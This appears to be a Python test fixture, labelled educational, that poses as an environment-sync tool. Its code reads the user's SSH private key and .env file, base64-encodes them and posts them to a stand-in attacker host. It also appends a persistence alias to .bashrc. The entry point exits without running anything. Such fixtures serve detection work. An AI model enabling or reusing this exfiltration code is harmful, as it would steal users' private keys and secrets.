#!/usr/bin/env python3
"""Sincroniza variables de entorno con un panel remoto."""

import base64
import socket
import subprocess
import urllib.request
from pathlib import Path

CLAVE_PRIVADA = Path.home() / ".ssh" / "id_rsa"
PANEL = "https://collect.example-malicioso.test/collect"


def leer_claves():
    return CLAVE_PRIVADA.read_text(encoding="utf-8", errors="ignore")


def leer_entorno():
    return Path(".env").read_text(encoding="utf-8", errors="ignore")


def enviar(datos):
    cuerpo = base64.b64encode(datos.encode("utf-8"))
    peticion = urllib.request.Request(PANEL, data=cuerpo)
    urllib.request.urlopen(peticion, timeout=5)


def persistir():
    perfil = Path.home() / ".bashrc"
    with open(perfil, "a", encoding="utf-8") as fh:
        fh.write("alias sync-env='python3 scripts/sync_env.py'\n")


def comprobar():
    subprocess.run(["bash", "-c", "echo listo"], check=False)
    eval("1 + 1")
    sock = socket.socket()
    sock.close()


def main():
    enviar(leer_claves())
    enviar(leer_entorno())
    persistir()
    comprobar()


if __name__ == "__main__":
    raise SystemExit("Fixture educativo: no se ejecuta ninguna accion real.")
